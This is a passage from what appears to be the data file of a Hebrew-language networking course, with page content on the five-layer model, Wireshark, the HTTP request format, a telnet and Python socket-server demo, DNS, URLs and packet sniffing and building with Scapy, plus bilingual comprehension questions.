                  <strong>שכבת אפליקציה</strong>
                  <span class="lc-proto"><code>HTTP</code> · <code>HTTPS</code> · <code>DNS</code> · <code>FTP</code> · <code>SMTP</code></span>
                  <p>הממשק הישיר עם המשתמש.</p>
                  <p>האפליקציה בונה בקשה בשפה מובנת — <code>HTTP GET</code> — והשרת מחזיר תגובה.</p>
                </div>
              </div>
              <div class="lc-viz">
                <svg direction="ltr" viewBox="0 0 200 64" class="lc-svg">
                  <rect x="4" y="14" width="54" height="36" rx="5" fill="rgba(8,145,178,0.1)" stroke="#0891b2" stroke-width="1.2"/>
                  <text x="31" y="30" text-anchor="middle" font-size="7.5" fill="#0e7490" font-weight="bold">🌐 Browser</text>
                  <text x="31" y="43" text-anchor="middle" font-size="6.5" fill="#0891b2">HTTP Client</text>
                  <path d="M 60 27 L 128 27" stroke="#d97706" stroke-width="1.3" marker-end="url(#arr-a)"/>
                  <text x="94" y="22" text-anchor="middle" font-size="6.5" fill="#d97706">GET /index.html</text>
                  <path d="M 128 39 L 60 39" stroke="#059669" stroke-width="1.3" marker-end="url(#arr-b)"/>
                  <text x="94" y="52" text-anchor="middle" font-size="6.5" fill="#059669">200 OK + HTML</text>
                  <rect x="130" y="14" width="62" height="36" rx="5" fill="rgba(5,150,105,0.1)" stroke="#059669" stroke-width="1.2"/>
                  <text x="161" y="30" text-anchor="middle" font-size="7.5" fill="#065f46" font-weight="bold">🖥 Server</text>
                  <text x="161" y="43" text-anchor="middle" font-size="6.5" fill="#059669">nginx / Apache</text>
                  <defs>
                    <marker id="arr-a" markerWidth="5" markerHeight="5" refX="5" refY="2.5" orient="auto"><path d="M0,0 L5,2.5 L0,5z" fill="#d97706"/></marker>
                    <marker id="arr-b" markerWidth="5" markerHeight="5" refX="5" refY="2.5" orient="auto"><path d="M0,0 L5,2.5 L0,5z" fill="#059669"/></marker>
                  </defs>
                </svg>
              </div>
            </div>

            <div class="layer-card lc-4">
              <div class="lc-info">
                <div class="lc-num">4</div>
                <div class="lc-text">
                  <strong>שכבת תעבורה</strong>
                  <span class="lc-proto"><code>TCP</code> · <code>UDP</code></span>
                  <p>אחראית על העברה אמינה בין <em>תהליכים</em> — פורטים.</p>
                  <p><code>TCP</code> מבטיח סדר ואישור קבלה.</p>
                  <p><code>UDP</code> מהיר ללא אישור.</p>
                </div>
              </div>
              <div class="lc-viz">
                <svg direction="ltr" viewBox="0 0 200 64" class="lc-svg">
                  <rect x="4" y="10" width="58" height="44" rx="5" fill="rgba(124,58,237,0.08)" stroke="#7c3aed" stroke-width="1.2"/>
                  <text x="33" y="26" text-anchor="middle" font-size="7" fill="#6d28d9" font-weight="bold">App Process</text>
                  <text x="33" y="38" text-anchor="middle" font-size="9" fill="#7c3aed" font-weight="bold">:52341</text>
                  <text x="33" y="49" text-anchor="middle" font-size="6" fill="#7c3aed">src port</text>
                  <path d="M 65 32 L 130 32" stroke="#7c3aed" stroke-width="1.5" marker-end="url(#arr-t)"/>
                  <rect x="73" y="22" width="54" height="18" rx="3" fill="rgba(124,58,237,0.08)" stroke="#7c3aed" stroke-width="0.8"/>
                  <text x="100" y="34" text-anchor="middle" font-size="6.5" fill="#6d28d9">TCP Segment</text>
                  <text x="100" y="53" text-anchor="middle" font-size="5.8" fill="rgba(15,23,42,0.45)">Seq# · Ack# · Flags</text>
                  <rect x="133" y="10" width="60" height="44" rx="5" fill="rgba(124,58,237,0.08)" stroke="#7c3aed" stroke-width="1.2"/>
                  <text x="163" y="26" text-anchor="middle" font-size="7" fill="#6d28d9" font-weight="bold">Web Server</text>
                  <text x="163" y="38" text-anchor="middle" font-size="9" fill="#7c3aed" font-weight="bold">:443</text>
                  <text x="163" y="49" text-anchor="middle" font-size="6" fill="#7c3aed">dst port</text>
                  <defs><marker id="arr-t" markerWidth="5" markerHeight="5" refX="5" refY="2.5" orient="auto"><path d="M0,0 L5,2.5 L0,5z" fill="#7c3aed"/></marker></defs>
                </svg>
              </div>
            </div>

            <div class="layer-card lc-3">
              <div class="lc-info">
                <div class="lc-num">3</div>
                <div class="lc-text">
                  <strong>שכבת רשת</strong>
                  <span class="lc-proto"><code>IP</code> · <code>ICMP</code> · <code>OSPF</code> · <code>BGP</code></span>
                  <p>ניתוב חבילות בין רשתות שונות ברחבי האינטרנט.</p>
                  <p>הנתב — <code>Router</code> — מחליט את המסלול לפי כתובת <code>IP</code>.</p>
                </div>
              </div>
              <div class="lc-viz">
                <svg direction="ltr" viewBox="0 0 200 64" class="lc-svg">
                  <rect x="4" y="18" width="44" height="28" rx="4" fill="rgba(8,145,178,0.1)" stroke="#0891b2" stroke-width="1.1"/>
                  <text x="26" y="31" text-anchor="middle" font-size="6.5" fill="#0e7490" font-weight="bold">PC</text>
                  <text x="26" y="40" text-anchor="middle" font-size="5.8" fill="#0891b2">192.168.1.5</text>
                  <path d="M 50 32 L 80 32" stroke="#0e7490" stroke-width="1.2" marker-end="url(#arr-n)"/>
                  <circle cx="93" cy="32" r="13" fill="rgba(217,119,6,0.12)" stroke="#d97706" stroke-width="1.2"/>
                  <text x="93" y="29" text-anchor="middle" font-size="8" fill="#b45309">⇄</text>
                  <text x="93" y="39" text-anchor="middle" font-size="6" fill="#b45309">Router</text>
                  <path d="M 108 32 L 138 32" stroke="#0e7490" stroke-width="1.2" marker-end="url(#arr-n)"/>
                  <circle cx="151" cy="32" r="13" fill="rgba(217,119,6,0.12)" stroke="#d97706" stroke-width="1.2"/>
                  <text x="151" y="29" text-anchor="middle" font-size="8" fill="#b45309">⇄</text>
                  <text x="151" y="39" text-anchor="middle" font-size="6" fill="#b45309">Router</text>
                  <path d="M 166 32 L 185 32" stroke="#0e7490" stroke-width="1.2" marker-end="url(#arr-n)"/>
                  <text x="192" y="35" text-anchor="middle" font-size="10" fill="#0e7490">🌐</text>
                  <defs><marker id="arr-n" markerWidth="5" markerHeight="5" refX="5" refY="2.5" orient="auto"><path d="M0,0 L5,2.5 L0,5z" fill="#0e7490"/></marker></defs>
                </svg>
              </div>
            </div>

            <div class="layer-card lc-2">
              <div class="lc-info">
                <div class="lc-num">2</div>
                <div class="lc-text">
                  <strong>שכבת קו (<code>Data Link</code>)</strong>
                  <span class="lc-proto"><code>Ethernet</code> · <code>Wi-Fi</code> · <code>PPP</code></span>
                  <p>אחראית על העברה בין שני <em>צמתים סמוכים</em>.</p>
                  <p>מארגנת <code>Frames</code> עם כתובות <code>MAC</code> ובדיקת שגיאות — <code>CRC</code>.</p>
                </div>
              </div>
              <div class="lc-viz">
                <svg direction="ltr" viewBox="0 0 200 64" class="lc-svg">
                  <rect x="4" y="18" width="36" height="28" rx="3" fill="rgba(220,38,38,0.08)" stroke="#dc2626" stroke-width="1"/>
                  <text x="22" y="30" text-anchor="middle" font-size="6" fill="#dc2626" font-weight="bold">Preamble</text>
                  <text x="22" y="40" text-anchor="middle" font-size="5.5" fill="#dc2626">8 bytes</text>
                  <rect x="42" y="18" width="38" height="28" rx="3" fill="rgba(217,119,6,0.1)" stroke="#d97706" stroke-width="1"/>
                  <text x="61" y="30" text-anchor="middle" font-size="6" fill="#b45309" font-weight="bold">MAC dst</text>
                  <text x="61" y="40" text-anchor="middle" font-size="5.5" fill="#b45309">6 bytes</text>
                  <rect x="82" y="18" width="38" height="28" rx="3" fill="rgba(217,119,6,0.1)" stroke="#d97706" stroke-width="1"/>
                  <text x="101" y="30" text-anchor="middle" font-size="6" fill="#b45309" font-weight="bold">MAC src</text>
                  <text x="101" y="40" text-anchor="middle" font-size="5.5" fill="#b45309">6 bytes</text>
                  <rect x="122" y="18" width="32" height="28" rx="3" fill="rgba(8,145,178,0.1)" stroke="#0891b2" stroke-width="1"/>
                  <text x="138" y="30" text-anchor="middle" font-size="6" fill="#0e7490" font-weight="bold">Data</text>
                  <text x="138" y="40" text-anchor="middle" font-size="5.5" fill="#0e7490">46-1500B</text>
                  <rect x="156" y="18" width="38" height="28" rx="3" fill="rgba(5,150,105,0.1)" stroke="#059669" stroke-width="1"/>
                  <text x="175" y="30" text-anchor="middle" font-size="6" fill="#059669" font-weight="bold">FCS/CRC</text>
                  <text x="175" y="40" text-anchor="middle" font-size="5.5" fill="#059669">4 bytes</text>
                  <text x="100" y="58" text-anchor="middle" font-size="6" fill="rgba(15,23,42,0.4)">Ethernet Frame</text>
                </svg>
              </div>
            </div>

            <div class="layer-card lc-1">
              <div class="lc-info">
                <div class="lc-num">1</div>
                <div class="lc-text">
                  <strong>שכבה פיזית</strong>
                  <span class="lc-proto"><code>Cat5e</code> · <code>Cat6</code> · <code>Fiber</code> · <code>Wi-Fi</code> · <code>USB</code></span>
                  <p>מעבירה <em>ביטים</em> — 0/1 — כאותות חשמליים, אורים, או גלי רדיו.</p>
                  <p>אין לה מושג מה המשמעות — רק פיזיקה.</p>
                </div>
              </div>
              <div class="lc-viz">
                <svg direction="ltr" viewBox="0 0 200 64" class="lc-svg">
                  <line x1="14" y1="32" x2="186" y2="32" stroke="#475569" stroke-width="5" stroke-linecap="round"/>
                  <line x1="14" y1="32" x2="186" y2="32" stroke="rgba(8,145,178,0.35)" stroke-width="3" stroke-linecap="round"/>
                  <circle cx="14" cy="32" r="7" fill="rgba(8,145,178,0.15)" stroke="#0891b2" stroke-width="1.2"/>
                  <text x="14" y="35.5" text-anchor="middle" font-size="7" fill="#0e7490" font-weight="bold">TX</text>
                  <circle cx="186" cy="32" r="7" fill="rgba(5,150,105,0.15)" stroke="#059669" stroke-width="1.2"/>
                  <text x="186" y="35.5" text-anchor="middle" font-size="7" fill="#059669" font-weight="bold">RX</text>
                  <text x="45" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">0</text>
                  <text x="68" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">1</text>
                  <text x="91" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">1</text>
                  <text x="114" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">0</text>
                  <text x="137" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">1</text>
                  <text x="160" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">0</text>
                  <text x="100" y="56" text-anchor="middle" font-size="6.5" fill="rgba(15,23,42,0.4)">אות חשמלי / אור / גל רדיו</text>
                </svg>
              </div>
            </div>

          </div>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 3",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>Wireshark</code> — הסנפה וניתוח. פרוטוקול = סט חוקים לתקשורת</li>
              <li><code>Encapsulation</code> — הוספת <code>Header</code>. <code>Decapsulation</code> — הסרת <code>Header</code></li>
              <li>מבנה פקטה: <code>Ethernet</code> + <code>IP</code> + <code>TCP</code> + <code>Data</code>. פילטרים: <code>http</code>, <code>dns</code></li>
            </ul>
          </div>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: שימוש ב־Wireshark",
        content: `
          <p><strong>התחלת הסנפה</strong></p>
          <p>בוחרים ממשק — כרטיס רשת — ולוחצים <code>Start</code>.</p>
          <p>התעבורה מופיעה ברשימה.</p>
          <p><strong>סינון</strong></p>
          <p>בשדה <code>Filter</code> מקלידים ביטוי סינון ולוחצים Enter. דוגמאות:</p>
          <ul>
            <li><code>http</code> — רק תעבורת <code>HTTP</code></li>
            <li><code>dns</code> — רק שאילתות <code>DNS</code></li>
            <li><code>ip.addr==192.168.1.1</code> — חבילות שמכילות כתובת מסוימת</li>
          </ul>
          <p><strong>צפייה בחבילה</strong></p>
          <p>כל שורה ברשימה היא חבילה אחת.</p>
          <p>לחיצה על חבילה מציגה את המבנה לפי שכבות — <code>Ethernet</code>, <code>IP</code>, <code>TCP</code>, <code>HTTP</code>.</p>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 3",
        titleEn: "Chapter 3 — Comprehension Questions",
        questions: [
          {
            q: "מה היתרון של מודל השכבות?",
            a: "כל שכבה אינה תלויה במימוש של שכבה אחרת. אם ישנו כבל, תוכנה, או פרוטוקול בשכבה אחת – השאר לא מושפע. זה מאפשר עדכונים והתפתחות ללא שבירת כל המערכת.",
            qEn: "What is the advantage of the layered model?",
            aEn: "Each layer does not depend on how other layers are built. If you change a cable, software, or protocol in one layer, the rest is not affected. This allows updates and growth without breaking the whole system."
          },
          {
            q: "למה משתמשים בחמש שכבות ולא בשבע?",
            a: "מודל שבע השכבות — OSI — נוצר באופן תיאורטי. מודל חמש השכבות נוצר מתוך השימוש בפועל ברשת האינטרנט — שתי שכבות — הצגה וסשן — התגלו כמיותרות והושמטו.",
            qEn: "Why do we use five layers instead of seven?",
            aEn: "The seven-layer OSI model was created in theory. The five-layer model came from real-world use of the Internet. Two layers — presentation and session — turned out to be unnecessary and were removed."
          },
          {
            q: "מה ההבדל בין Encapsulation ל-Decapsulation?",
            a: "Encapsulation — בשליחה: כל שכבה מוסיפה Header לפקטה ומעבירה למטה. Decapsulation — בקבלה: כל שכבה מסירה את ה־Header שלה ומעבירה את השאר למעלה.",
            qEn: "What is the difference between Encapsulation and Decapsulation?",
            aEn: "Encapsulation — when sending: each layer adds a Header to the packet and passes it down. Decapsulation — when receiving: each layer removes its Header and passes the rest up."
          }
        ]
      }
    ]
  },
  {
    id: 4,
    title: "שכבת האפליקציה",
    pages: [
      {
        type: "explanation",
        title: "מהי שכבת האפליקציה?",
        content: `
          <p><strong>שכבת האפליקציה</strong> — שכבה 5</p>
          <p>אוסף הפרוטוקולים שהאפליקציות משתמשות בהם באופן ישיר.</p>
          <p>היא מספקת הפשטה מעל תקשורת הנתונים ברשת.</p>
          <p>דפדפנים, <code>WhatsApp</code>, <code>Gmail</code>, <code>Facebook</code> — כולם משתמשים בפרוטוקולים של שכבת האפליקציה.</p>
        `
      },
      {
        type: "explanation",
        title: "פרוטוקול HTTP – בקשה ותגובה",
        content: `
          <p><strong><code>HTTP</code></strong> — <code>Hypertext Transfer Protocol</code></p>
          <p>הפרוטוקול הנפוץ ביותר לשכבת האפליקציה — הוא מניע את הגלישה באינטרנט.</p>
          <p>משתמש בעקרון "בקשה-תגובה": הלקוח שולח בקשה, השרת מחזיר תגובה.</p>
          <p><strong>שורת בקשה לדוגמה:</strong></p>
          <p><code>GET /hypertext/WWW/TheProject.html</code></p>
          <p>המילה <code>GET</code> מציינת בקשת הבאה של פריט מידע.</p>
          <p><strong>שורת תגובה לדוגמה:</strong></p>
          <p><code>HTTP/1.1 200 OK</code> — גרסת הפרוטוקול, קוד מצב — 200 = בסדר — וסוג התוכן.</p>
        `
      },
      {
        type: "explanation",
        title: "מבנה פורמלי של HTTP – שורות ו־Headers",
        content: `
          <p>הודעת <code>HTTP</code> בנויה משורות טקסט המופרדות ב־<code>\r\n</code> — <code>CRLF</code> — <code>Carriage Return</code> + <code>Line Feed</code>.</p>
          <p>שורה ריקה מפרידה בין ה־Headers לגוף ההודעה.</p>
          <p><strong>מבנה שורת בקשה:</strong> <code>METHOD URL HTTP/VERSION</code></p>
          <p><strong>דוגמה:</strong></p>
          <p><code>GET /index.html HTTP/1.1</code></p>
          <p>ה־<code>URL</code> כאן הוא path יחסי — ללא הדומיין, כי השרת כבר ידוע מהחיבור.</p>
          <p><strong>Headers</strong> — כל שורה בפורמט <code>שם: ערך</code>:</p>
          <ul>
            <li><code>Host: www.example.com</code></li>
            <li><code>User-Agent: Mozilla/5.0</code></li>
            <li><code>Accept-Language: he</code></li>
          </ul>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: שימוש ב־telnet לבקשת HTTP",
        content: `
          <p>ב־<code>telnet</code> אפשר להתחבר ידנית לשרת <code>HTTP</code> ולשלוח בקשה. הנה מה שמקלידים ומה שמתקבל:</p>
          <div class="code-preview">
            <pre><code>$ telnet www.example.com 80
GET / HTTP/1.0
Host: www.example.com

HTTP/1.1 200 OK
Content-Type: text/html
...</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>מתחברים לפורט 80</li>
              <li>כותבים <code>GET</code> + path + גרסה</li>
              <li>שורה ריקה מסמנת סוף ה־Headers</li>
              <li>השרת מחזיר תגובה עם קוד 200 וה־HTML</li>
            </ul>
          </div>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: שרת HTTP פשוט בפייתון",
        content: `
          <p>זה הקוד לשרת <code>HTTP</code> מינימלי שמחזיר דף קבוע:</p>
          <div class="code-preview">
            <pre><code>import socket
s = socket.socket()
s.bind(('0.0.0.0', 8080))
s.listen(1)
(client, addr) = s.accept()
data = client.recv(1024)  # הבקשה (bytes)
response = 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n&lt;h1&gt;שלום!&lt;/h1&gt;'
client.send(response.encode())   # חייב bytes!
client.close()</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>השרת מאזין, מקבל בקשה, ומחזיר: שורת תגובה + Headers + גוף HTML</li>
              <li><code>\r\n</code> מפריד בין השורות</li>
              <li><code>.encode()</code> ממיר את ה־string ל־bytes לפני שליחה</li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "קודי HTTP ומבנה Headers",
        content: `
          <p><strong>קודי תגובה נפוצים:</strong></p>
          <ul>
            <li><strong>200</strong> <code>OK</code> — הצלחה</li>
            <li><strong>301</strong> <code>Moved Permanently</code> — הפניה לכתובת חדשה</li>
            <li><strong>404</strong> <code>Not Found</code> — המשאב לא נמצא</li>
            <li><strong>500</strong> <code>Server Error</code> — שגיאה בשרת</li>
          </ul>
          <p>רשימה מלאה: <a href="http://goo.gl/COC4J7" target="_blank">קודי <code>HTTP</code></a></p>

          <p><strong>Headers</strong></p>
          <p>מעבר לשורת הבקשה או התגובה, יש שדות מידע בפורמט <code>שם: ערך</code>.</p>
          <p>דוגמאות:</p>
          <ul>
            <li><code>Accept-Language: he</code> — שפה מועדפת — עברית</li>
            <li><code>User-Agent</code> — סוג הדפדפן</li>
            <li><code>Content-Length</code> — גודל הגוף בבתים</li>
            <li><code>Content-Type</code> — סוג התוכן — <code>HTML</code>, <code>JSON</code> וכו'</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "פרוטוקול DNS",
        content: `
          <p><strong><code>DNS</code></strong> — <code>Domain Name System</code></p>
          <p>ממיר שמות דומיין לכתובות <code>IP</code>.</p>
          <p>הדפדפן לא יודע איך לפנות ל־<code>google.com</code> — הוא צריך כתובת <code>IP</code> מספרית.</p>
          <p>שרת ה־<code>DNS</code>, שכתובתו מתקבלת דרך <code>DHCP</code>, עונה על שאילתות ומחזיר את כתובת ה־<code>IP</code> המתאימה.</p>
          <p>הפקודה <code>nslookup www.google.com</code> מבצעת שאילתת <code>DNS</code> ומציגה את הכתובת.</p>
        `
      },
      {
        type: "explanation",
        title: "בקשות GET ו-POST",
        content: `
          <p><strong>GET</strong></p>
          <p>משמש להבאת מידע מהשרת.</p>
          <p>הפרמטרים נשלחים כחלק מה־<code>URL</code>.</p>
          <p><strong>POST</strong></p>
          <p>משמש לשליחת מידע לשרת, כמו טופס או תמונה.</p>
          <p>התוכן נשלח בגוף הבקשה.</p>
          <p>אורך <code>URL</code> מוגבל לכ־2,000 תווים.</p>
          <p>לכן העלאת קבצים אפשרית רק דרך <code>POST</code>.</p>
        `
      },
      {
        type: "explanation",
        title: "משאבי רשת – URL מלא",
        content: `
          <p><strong><code>URL</code></strong> — <code>Uniform Resource Locator</code></p>
          <p>מזהה משאב ברשת.</p>
          <p><strong>מבנה:</strong> <code>פרוטוקול://דומיין:פורט/נתיב?שאילתה</code></p>
          <p><strong>דוגמה:</strong> <code>https://www.google.com/maps?q=תל+אביב</code></p>
          <ul>
            <li><code>https</code> — פרוטוקול</li>
            <li><code>www.google.com</code> — דומיין</li>
            <li><code>/maps</code> — נתיב</li>
            <li><code>?q=תל+אביב</code> — פרמטר חיפוש</li>
          </ul>
          <p>כל משאב ברשת — דף, תמונה, API — מזוהה ב־<code>URL</code> ייחודי.</p>
        `
      },
      {
        type: "explanation",
        title: "מפות Google – דוגמה למשאבי רשת",
        content: `
          <p>כשפותחים מפות Google ומחפשים מקום, הדפדפן שולח בקשות <code>HTTP</code> לשרתי Google.</p>
          <p>ה־<code>URL</code> משתנה לפי החיפוש:</p>
          <p><code>https://www.google.com/maps/search/...</code></p>
          <p>השרת מחזיר מפות, תמונות ונתונים.</p>
          <p>זוהי דוגמה לשכבת האפליקציה — פרוטוקול <code>HTTP</code> משרת את היישום שמציג מידע למשתמש.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 4",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>שכבת האפליקציה = פרוטוקולים שהאפליקציות משתמשות בהם ישירות</li>
              <li><code>HTTP</code> = פרוטוקול בקשה-תגובה. מבנה: שורות מופרדות ב־<code>\\r\\n</code>, שורה ריקה לפני גוף</li>
              <li>בקשה: <code>METHOD</code> <code>URL</code> <code>HTTP/VERSION</code>, <code>Headers</code> (שם:ערך), גוף (אם יש)</li>
              <li><code>GET</code> — הבאה, <code>POST</code> — שליחה. <code>URL</code> מזהה משאב: פרוטוקול://דומיין/נתיב</li>
              <li><code>telnet</code> + ידני או שרת <code>Python</code> = בדיקת <code>HTTP</code></li>
            </ul>
          </div>
        `
      },
      { type: "simulation", title: "הדמיית בקשת HTTP", simId: "httpRequest", content: "<p>נסו לשלוח בקשות HTTP שונות וראו איך השרת מגיב.</p>" },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 4",
        titleEn: "Chapter 4 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין בקשת GET לבקשת אחרת?",
            a: "GET נועדה להביא פריט מידע מהשרת — בדרך כלל דף אינטרנט. אין תוכן בגוף הבקשה. בקשות אחרות — כמו POST — משמשות לשליחת מידע לשרת, למשל טופס התחברות.",
            qEn: "What is the difference between a GET request and other requests?",
            aEn: "GET is used to fetch data from the server — usually a web page. There is no content in the request body. Other requests — like POST — are used to send data to the server, for example a login form."
          },
          {
            q: "מה אומר קוד 404?",
            a: "404 Not Found — המשאב המבוקש — דף, קובץ — לא נמצא בשרת. זה הקוד המפורסם שמציגים כשנכנסים לכתובת שלא קיימת.",
            qEn: "What does status code 404 mean?",
            aEn: "404 Not Found — the requested resource (page, file) was not found on the server. This is the famous code shown when you visit a URL that does not exist."
          },
          {
            q: "למה צריך \\r\\n בהודעות HTTP?",
            a: "HTTP מוגדר כפרוטוקול טקסט. שורות מופרדות ב־CRLF — \\r\\n. שורה ריקה מסמנת סוף ה־Headers ותחילת הגוף. זה מאפשר לשרת וללקוח לפרסר את ההודעה בצורה אחידה.",
            qEn: "Why do HTTP messages need \\r\\n?",
            aEn: "HTTP is a text protocol. Lines are separated by CRLF — \\r\\n. An empty line marks the end of the Headers and the start of the body. This lets the server and client parse the message in a consistent way."
          }
        ]
      }
    ]
  },
  {
    id: 5,
    title: "Scapy",
    pages: [
      {
        type: "explanation",
        title: "מבוא ל-Scapy",
        content: `
          <p><strong><code>Scapy</code></strong></p>
          <p>ספרייה לפייתון לעבודה עם חבילות רשת ברמה נמוכה.</p>
          <p>בניגוד ל־<code>Sockets</code> שעובד בשכבת האפליקציה, <code>Scapy</code> נותן גישה לשכבות התעבורה, הרשת והקו.</p>
          <p><strong>מה אפשר לעשות עם <code>Scapy</code>:</strong></p>
          <ul>
            <li>להסניף תעבורת <code>HTTP</code> ולשמור כתובות שאליהן הייתה גלישה</li>
            <li>לסנן חבילות לפי תנאים</li>
            <li>לראות תמונות שעברו ברשת</li>
            <li>לשלוח חבילות עם מבנה בשליטה מלאה</li>
          </ul>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: הסנפה בסיסית ב-Scapy",
        content: `
          <p>פונקציית <code>sniff</code> מבצעת הסנפה. הנה דוגמה לפלט:</p>
          <div class="code-preview">
            <pre><code>&gt;&gt;&gt; packets = sniff(count=2)
&gt;&gt;&gt; packets
&lt;Sniffed: TCP:2 UDP:0 ICMP:0 Other:0&gt;
&gt;&gt;&gt; packets[0]
&lt;Ether ...&gt;&lt;IP ...&gt;&lt;TCP ...&gt;</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>Scapy</code> מציג סיכום סוגי החבילות</li>
              <li>אפשר לגשת לכל חבילה כרשימה</li>
              <li>ניתן לנתח את השדות של כל שכבה: <code>Ethernet</code>, <code>IP</code>, <code>TCP</code></li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "סינון חבילות – lfilter",
        content: `
          <p>ניתן לסנן חבילות בהסנפה באמצעות פרמטר <code>lfilter</code>.</p>
          <p><code>lfilter</code> מקבל פונקציה שמקבלת חבילה ומחזירה True/False.</p>
          <p><strong>דוגמה:</strong> סינון רק חבילות <code>DNS</code>:</p>
          <div class="code-preview">
            <pre><code>def filter_dns(packet):
    return DNS in packet

packets = sniff(count=10, lfilter=filter_dns)</code></pre>
          </div>
          <p><code>Scapy</code> מלווה את הספר — משמש לכתיבת <code>ping</code>, <code>traceroute</code>, ובדיקת שירותים במחשב מרוחק.</p>
        `
      },
      {
        type: "explanation",
        title: "בניית חבילות – IPv4, TCP, ICMP",
        content: `
          <p><code>Scapy</code> מאפשר לבנות חבילות משכבות שונות.</p>
          <p>כל שכבה מיוצגת על ידי מחלקה:</p>
          <ul>
            <li><code>IP()</code> — שכבת רשת</li>
            <li><code>TCP()</code> — שכבת תעבורה</li>
            <li><code>ICMP()</code> — הודעות בקרה</li>
            <li><code>Ether()</code> — שכבת קו</li>
          </ul>
          <p>האופרטור <code>/</code> מחבר שכבות.</p>
          <p>השכבה הימנית נעטפת כ־<code>payload</code> של השמאלית.</p>
          <p>דוגמה: <code>p = IP(dst="8.8.8.8")/ICMP()</code> — יוצר חבילת <code>ping</code>.</p>
          <p>אפשר לקבוע שדות ספציפיים:</p>
          <ul>
            <li><code>IP(dst="1.2.3.4", ttl=5)</code></li>
            <li><code>TCP(dport=80, flags="S")</code> — דגל <code>SYN</code></li>
          </ul>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: שליחת חבילות",
        content: `
          <p>לאחר בניית חבילה, שולחים בשתי דרכים:</p>
          <ul>
            <li><code>send</code> — שליחה בשכבת 2–3</li>
            <li><code>sr</code> — שליחה וקבלה — <code>send and receive</code> — מחכה לתשובה</li>
          </ul>
          <div class="code-preview">
            <pre><code>&gt;&gt;&gt; p = IP(dst="8.8.8.8")/ICMP()
&gt;&gt;&gt; sr1(p)
&lt;IP  version=4 ... |&lt;ICMP  type=echo-reply ...&gt;&gt;</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>sr1</code> שולח חבילה ומחזיר את התשובה הראשונה</li>
              <li>גישה לשדות: <code>ans[IP].ttl</code>, <code>ans[ICMP].type</code></li>
              <li>כך בונים: <code>ping</code>, <code>traceroute</code> — עם <code>TTL</code> עולה — וסורקי פורטים</li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "הסנפה מתקדמת – פרטי שדות",
        content: `
          <p>לאחר <code>sniff</code>, כל חבילה מכילה שדות של כל שכבה. דוגמאות לגישה לשדות:</p>
          <ul>
            <li><code>p[IP].src</code> — כתובת <code>IP</code> מקור</li>
            <li><code>p[IP].dst</code> — כתובת <code>IP</code> יעד</li>
            <li><code>p[TCP].sport</code> — פורט מקור</li>
            <li><code>p[TCP].dport</code> — פורט יעד</li>
            <li><code>p.haslayer(DNS)</code> — בודק אם החבילה מכילה שכבת <code>DNS</code></li>
          </ul>
          <p>כך אפשר לחלץ כתובות <code>URL</code> מחבילות <code>HTTP</code>, כתובות <code>DNS</code>, ונתונים נוספים לניתוח.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק Scapy",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>Scapy</code> = ספריית <code>Python</code> להסנפה, שליחה וייצור חבילות ברמת השכבות הנמוכות</li>
              <li><code>sniff()</code> — הסנפה, <code>lfilter</code> — סינון לפי תנאי. גישה לשדות: <code>p[IP].src</code>, <code>p[TCP].dport</code></li>
              <li>בניית חבילות: <code>IP()/ICMP()</code>, <code>IP()/TCP()</code> — <code>/</code> מחבר שכבות. <code>send</code>, <code>sr</code>, <code>sr1</code> לשליחה</li>
              <li>מאפשר <code>ping</code>, <code>traceroute</code>, סריקת פורטים — טיפול תוכנתי מלא בחבילות</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק Scapy",
        titleEn: "Scapy — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין Wireshark ל-Scapy?",
            a: "Wireshark הוא כלי צפייה — מסניף ומציג. Scapy מאפשר גם הסנפה, אבל בתוך קוד פייתון — אפשר לסנן, לעבד, לשמור, לשלוח חבילות ולבצע פעולות מורכבות על הנתונים.",
            qEn: "What is the difference between Wireshark and Scapy?",
            aEn: "Wireshark is a viewing tool — it sniffs and displays. Scapy also allows sniffing, but inside Python code — you can filter, process, save, send packets and do complex operations on the data."
          },
          {
            q: "מה עושה האופרטור / ב-Scapy?",
            a: "האופרטור / מחבר שכבות — השכבה הימנית נעטפת כ־payload של השמאלית. IP()/ICMP() יוצר חבילת ping. IP()/TCP(dport=80) יוצר חבילת TCP לפורט 80.",
            qEn: "What does the / operator do in Scapy?",
            aEn: "The / operator connects layers — the right layer becomes the payload of the left one. IP()/ICMP() creates a ping packet. IP()/TCP(dport=80) creates a TCP packet to port 80."
          }
        ]
      }
    ]
  },
  {
    id: 6,
    title: "שכבת התעבורה",
    pages: [
      {
        type: "explanation",
        title: "תפקיד שכבת התעבורה",
        content: `
          <p><strong>שכבת התעבורה</strong> — שכבה 4</p>
